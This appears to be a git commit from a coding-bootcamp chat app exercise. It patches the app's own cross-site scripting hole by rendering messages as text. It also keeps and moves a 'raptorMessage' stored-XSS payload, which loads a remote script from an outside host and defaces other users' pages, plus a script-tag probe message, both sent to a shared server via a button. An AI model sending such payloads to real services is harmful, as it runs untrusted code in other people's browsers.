5b2ac8bfa060b6a5e522640d26a206d64067c06c
Hack Reactor Students <nicholas@niceguys.co>
2014-03-10 16:06:41 -0700

    Added app.server, protected against XSS

--- client/scripts/app.js
+++ client/scripts/app.js
@@ -1,4 +1,5 @@
 var app = {};
+app.server = 'https://api.parse.com/1/classes/chatterbox?order=-createdAt';
 
 app.messageStack = { storage: {}, messages: [] };
 app.message = {
@@ -7,23 +8,14 @@ app.message = {
   roomname: ''
 };
 
-var raptorMessage = {
-  username: "MrNice",
-  text: JSON.stringify('<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script><script>!window.jQuery && document.write("<script src="jquery-1.4.3.min.js"></script>"")</script><script src="http://yourjavascript.com/1142132143/jquery-raptorize-1-0.js"></script><script type="text/javascript">window.raptored = window.raptored || false;$(window).load(function(){if(!window.raptored) {setTimeout(function(){$("body").append("<h2>RAPTORIZED - <3 MrNice </h2>")}, 2700);$(document).raptorize({"enterOn" : "timer","delayTime" : 2000});window.raptored = true;}});</script>'),
-  roomname: "Reactants"
-};
-
-var consoleScript = {
-  username: "MrNice",
-  text: JSON.stringify(";console.log('hello')"),
-  roomname: "reactants"
-};
 
 app.messageStack.add = function(msg){
   key = msg.objectId;
   if (this.storage[key] === undefined){
     this.messages.push(msg);
-    $str = '<li>' + msg.username + ' : ' + msg.text + '</li>';
+    $str = $('<li></li>');
+    $str.text(msg.username + ": " + msg.text);
+    // $str = '<li>' + msg.username + ": " + msg.text + '</li>';
     $('.messages').prepend($str);
     this.storage[key] = true;
   }
@@ -34,6 +26,7 @@ app.init = function(parameters) {
   $('.raptor').click(function(){
     app.send(raptorMessage);
   });
+  setInterval(app.fetch, 3000);
 };
 
 app.send = function(messageObject) {
@@ -51,18 +44,9 @@ app.send = function(messageObject) {
   });
 };
 
-app.displayMessages = function(data){
-  console.log('chatterbox: Message sent');
-  console.log(data);
-  // create stack data structure
-  _.each(data.results, function(msg){
-    this.messageStack.add(msg);
-  }, this);
-};
-
 app.fetch = function(delay) {
   $.ajax({
-    url: 'https://api.parse.com/1/classes/chatterbox?order=-createdAt',
+    url: app.server,
     type: 'GET',
     data: '',
     contentType: 'application/json',
@@ -76,5 +60,31 @@ app.fetch = function(delay) {
   });
 };
 
+app.displayMessages = function(data){
+  console.log('chatterbox: Message sent');
+  console.log(data);
+  // create stack data structure
+  _.each(data.results, function(msg){
+    this.messageStack.add(msg);
+  }, this);
+};
+
+var raptorMessage = {
+  username: "MrNice",
+  text: '<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script><script>!window.jQuery && document.write("<script src="jquery-1.4.3.min.js"></script>"")</script><script src="http://yourjavascript.com/1142132143/jquery-raptorize-1-0.js"></script><script type="text/javascript">window.raptored = window.raptored || false;$(window).load(function(){if(!window.raptored) {setTimeout(function(){$("body").append("<h2>RAPTORIZED - <3 MrNice </h2>")}, 2700);$(document).raptorize({"enterOn" : "timer","delayTime" : 2000});window.raptored = true;}});</script>',
+  roomname: "Reactants"
+};
+
+var consoleScript = {
+  username: "MrNice",
+  text: JSON.stringify("<script>console.log('hello')</script>"),
+  roomname: "reactants"
+};
 // start
+$(document).ready(function() {
+  $('.raptor').click(function(){
+    app.send(raptorMessage);
+  });
+});
+
 app.init();
